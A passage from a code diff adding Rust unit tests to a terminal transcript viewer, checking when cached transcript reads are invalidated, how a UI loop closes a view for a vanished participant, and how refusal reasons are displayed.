+    assert!(
+        new.turns.iter().any(|turn| turn
+            .blocks
+            .iter()
+            .any(|block| block.text == "another event")),
+        "the unassociated event survives: {:?}",
+        new.turns
+    );
+    assert_eq!(
+        new.turns
+            .iter()
+            .filter(|turn| turn.blocks.iter().any(|block| block.text == "the ruling"))
+            .count(),
+        1,
+        "the ruling is shown once: {:?}",
+        new.turns
+    );
+    assert!(transcript_invalidates(Some(&old), Some(&new)));
+}
+
+#[test]
+fn transcript_invalidates_compares_every_identity_member() {
+    use brokkr_view::transcript::{SourceIdentity, TranscriptKind, TranscriptRead, Unavailable};
+
+    let base = || {
+        TranscriptRead::readable(
+            None,
+            false,
+            TranscriptKind::ClaudeSession,
+            Some("/p".to_string()),
+            Vec::new(),
+            false,
+            0,
+            0,
+        )
+    };
+    let old = base();
+    let refused = TranscriptRead::refused(
+        None,
+        false,
+        Unavailable::Unreadable,
+        "x",
+        None,
+        false,
+        0,
+        0,
+        None,
+    );
+    assert!(transcript_invalidates(Some(&old), Some(&refused)));
+    assert!(transcript_invalidates(Some(&refused), Some(&old)));
+
+    let mut other = base();
+    other.reference = Some(brokkr_view::Transcript {
+        kind: "claude-session".to_string(),
+        locator: "a".to_string(),
+        home: "/h".to_string(),
+    });
+    assert!(transcript_invalidates(Some(&old), Some(&other)));
+
+    let mut other = base();
+    other.path = Some("/q".to_string());
+    assert!(transcript_invalidates(Some(&old), Some(&other)));
+
+    let mut other = base();
+    other.kind = Some(TranscriptKind::CodexThread);
+    assert!(transcript_invalidates(Some(&old), Some(&other)));
+
+    let mut other = base();
+    other.source_identity = Some(SourceIdentity {
+        device: 1,
+        inode: 2,
+    });
+    assert!(transcript_invalidates(Some(&old), Some(&other)));
+
+    assert!(transcript_invalidates(None, Some(&old)));
+    assert!(transcript_invalidates(Some(&old), None));
+    assert!(!transcript_invalidates(None, None));
+    assert!(!transcript_invalidates(Some(&old), Some(&base())));
+}
+
+/// The `drive` loop's own L6/M6 transition: an open turn door is
+/// recomposed from a notice-only refresh, and a participant that vanishes
+/// from the fresh fold closes the door in the same frame.
+#[test]
+fn drive_recomposes_a_turn_door_then_clears_a_vanished_subject() {
+    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
+    let saved = std::panic::take_hook();
+    let mut terminal = Terminal::new(TestBackend::new(140, 30)).unwrap();
+
+    let mut first = views();
+    first.transcript = Some(read_of(turns_of(2), false));
+    let mut refreshed = views();
+    refreshed.transcript = Some(read_of(turns_of(2), false));
+    let mut readable_again = views();
+    readable_again.transcript = Some(read_of(turns_of(2), false));
+    let mut vanished = views_with("absent");
+    if let Some(run) = vanished.run.as_mut() {
+        run.participants.clear();
+    }
+    vanished.transcript = Some(read_of(turns_of(2), false));
+
+    let mut tui = at_transcript(&first);
+    script(&[Key::Down, Key::Enter, Key::Char('x'), Key::Quit]);
+
+    let mut answers: Vec<Option<Views>> = vec![
+        Some(first),
+        Some(refreshed),
+        Some(readable_again),
+        Some(vanished),
+    ];
+    let mut source = move |_: Ask| {
+        if answers.is_empty() {
+            return Ok(None);
+        }
+        Ok(answers.remove(0))
+    };
+    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 6).unwrap();
+    assert!(
+        tui.reading.is_none(),
+        "the vanished subject's door is closed"
+    );
+    assert!(!tui.reading_transcript);
+    assert_eq!(tui.read_offset, 0);
+    std::panic::set_hook(saved);
+}
+
+#[test]
+fn refused_lines_carry_the_reason_and_an_optional_explanation() {
+    let reason = brokkr_view::transcript::Unavailable::NotFound;
+    let mut read = brokkr_view::transcript::TranscriptRead::refused(
+        None,
+        false,
+        reason,
+        "no retained transcript file was found",
+        None,
+        false,
+        0,
+        0,
+        None,
+    );
+    let with_explanation = refused_lines(&read, reason);
+    assert!(with_explanation.len() >= 2);
+
+    read.explanation = None;
+    let without_explanation = refused_lines(&read, reason);
+    assert!(without_explanation.len() < with_explanation.len());
 }
 
 // ------------------------------------------------ the run level's estate
